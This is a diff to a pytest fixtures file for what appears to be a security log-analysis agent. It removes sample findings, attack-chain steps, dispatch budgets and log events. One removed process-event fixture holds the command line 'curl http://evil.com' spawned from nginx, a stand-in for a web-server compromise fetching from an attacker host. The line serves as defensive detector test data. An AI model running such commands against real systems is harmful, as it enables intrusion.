@@ -9,9 +9,6 @@ from unittest.mock import MagicMock
 
 import pytest
 
-from agent_py_agent.agent.log_analysis.dispatch.budgets import DispatchBudget
-from agent_py_agent.agent.log_analysis.models import CaseRecord, EvidenceRef, Finding
-from agent_py_agent.agent.log_analysis.security.attack_chain import AttackChainStep
 from agent_py_agent.agent.subagents.models import SubAgentTask
 
 
@@ -29,79 +26,6 @@ def _isolate_my_agent_home(tmp_path_factory, monkeypatch):
 
 
 # ---------------------------------------------------------------------------
-# Finding / Evidence fixtures
-# ---------------------------------------------------------------------------
-
-@pytest.fixture
-def sample_evidence_ref() -> EvidenceRef:
-    """创建示例 EvidenceRef。"""
-    return EvidenceRef(
-        evidence_id="ev-sample-001",
-        kind="event",
-        source_id="waf-01",
-        raw_ref="raw-001",
-        summary="sample evidence",
-    )
-
-
-@pytest.fixture
-def sample_finding(make_finding_func) -> Finding:
-    """创建示例 Finding（使用 factory 函数）。"""
-    return make_finding_func()
-
-
-@pytest.fixture
-def make_finding_func():
-    """Factory 函数：创建自定义 Finding。"""
-    def _make(finding_id: str = "f-test-001", **kwargs) -> Finding:
-        defaults = {
-            "finding_id": finding_id,
-            "detector_id": "waf_attack_success_candidate",
-            "window": ["2024-01-01T10:00:00Z"],
-            "entities": {"attacker_ip": ["1.2.3.4"]},
-            "confidence": 0.75,
-            "risk_score": 0.75,
-            "evidence_refs": [],
-            "hypothesis": "test hypothesis",
-        }
-        defaults.update(kwargs)
-        return Finding(**defaults)
-    return _make
-
-
-# ---------------------------------------------------------------------------
-# CaseRecord fixtures
-# ---------------------------------------------------------------------------
-
-@pytest.fixture
-def sample_case_record() -> CaseRecord:
-    """创建示例 CaseRecord。"""
-    return CaseRecord(
-        case_id="case-test-001",
-        title="测试案例",
-        status="OPEN",
-        priority="P2",
-        risk_score=0.75,
-    )
-
-
-# ---------------------------------------------------------------------------
-# AttackChainStep fixtures
-# ---------------------------------------------------------------------------
-
-@pytest.fixture
-def sample_attack_chain_step() -> AttackChainStep:
-    """创建示例 AttackChainStep。"""
-    return AttackChainStep(
-        time="2024-01-01T10:00:00Z",
-        stage="initial_access",
-        action="Web exploit",
-        entities={"attacker_ip": ["1.2.3.4"]},
-        confidence=0.85,
-    )
-
-
-# ---------------------------------------------------------------------------
 # SubAgentTask fixtures
 # ---------------------------------------------------------------------------
 
@@ -115,32 +39,6 @@ def sample_subagent_task() -> SubAgentTask:
         plan=["步骤1", "步骤2", "步骤3"],
         status="PLANNING",
         depth=0,
-    )
-
-
-# ---------------------------------------------------------------------------
-# DispatchBudget fixtures
-# ---------------------------------------------------------------------------
-
-@pytest.fixture
-def sample_dispatch_budget() -> DispatchBudget:
-    """创建允许调度的 DispatchBudget。"""
-    return DispatchBudget(
-        case_auto_dispatch_enabled=True,
-        max_parallel_analyst_agents=3,
-        analyst_agent_budget_per_hour=10,
-        p0_auto_dispatch_enabled=True,
-        p1_auto_dispatch_enabled=True,
-    )
-
-
-@pytest.fixture
-def disabled_dispatch_budget() -> DispatchBudget:
-    """创建禁用的 DispatchBudget（所有能力关闭）。"""
-    return DispatchBudget(
-        case_auto_dispatch_enabled=False,
-        max_parallel_analyst_agents=0,
-        analyst_agent_budget_per_hour=0,
     )
 
 
@@ -269,89 +167,6 @@ def make_fake_store_func():
             _attach_mock_connection(store, options["mock_conn"])
         return store
     return _make
-
-
-# ---------------------------------------------------------------------------
-# Log event fixtures
-# ---------------------------------------------------------------------------
-
-@pytest.fixture
-def sample_waf_event() -> dict[str, Any]:
-    """创建示例 WAF 事件。"""
-    return {
-        "event_class": "alert",
-        "alert_type": "waf",
-        "source_product": "waf",
-        "uri": "/test",
-        "src_ip": "1.2.3.4",
-        "victim_ip": "10.0.0.1",
-        "severity": "high",
-        "event_time": "2024-01-01T10:00:00Z",
-    }
-
-
-@pytest.fixture
-def sample_vpn_event() -> dict[str, Any]:
-    """创建示例 VPN 事件。"""
-    return {
-        "event_class": "auth",
-        "event_action": "login",
-        "event_outcome": "success",
-        "source_product": "vpn",
-        "user": "alice",
-        "src_ip": "1.2.3.4",
-        "event_time": "2024-01-01T10:00:00Z",
-    }
-
-
-@pytest.fixture
-def sample_auth_failure_events() -> list[dict[str, Any]]:
-    """创建示例认证失败事件列表。"""
-    return [
-        {
-            "event_class": "auth",
-            "event_action": "login",
-            "event_outcome": "failure",
-            "user": "alice",
-            "src_ip": "1.2.3.4",
-            "victim_ip": "10.0.0.1",
-            "event_time": "2024-01-01T10:00:00Z",
-        },
-        {
-            "event_class": "auth",
-            "event_action": "login",
-            "event_outcome": "failure",
-            "user": "alice",
-            "src_ip": "1.2.3.4",
-            "victim_ip": "10.0.0.1",
-            "event_time": "2024-01-01T10:01:00Z",
-        },
-        {
-            "event_class": "auth",
-            "event_action": "login",
-            "event_outcome": "success",
-            "user": "alice",
-            "src_ip": "1.2.3.4",
-            "victim_ip": "10.0.0.1",
-            "event_time": "2024-01-01T10:05:00Z",
-        },
-    ]
-
-
-@pytest.fixture
-def sample_process_event() -> dict[str, Any]:
-    """创建示例进程事件。"""
-    return {
-        "source_product": "edr",
-        "event_class": "process",
-        "process_name": "bash",
-        "parent_process_name": "nginx",
-        "event_action": "exec",
-        "cmdline": "curl http://evil.com",
-        "src_ip": "1.2.3.4",
-        "victim_ip": "10.0.0.1",
-        "event_time": "2024-01-01T10:00:00Z",
-    }
 
 
 # ---------------------------------------------------------------------------
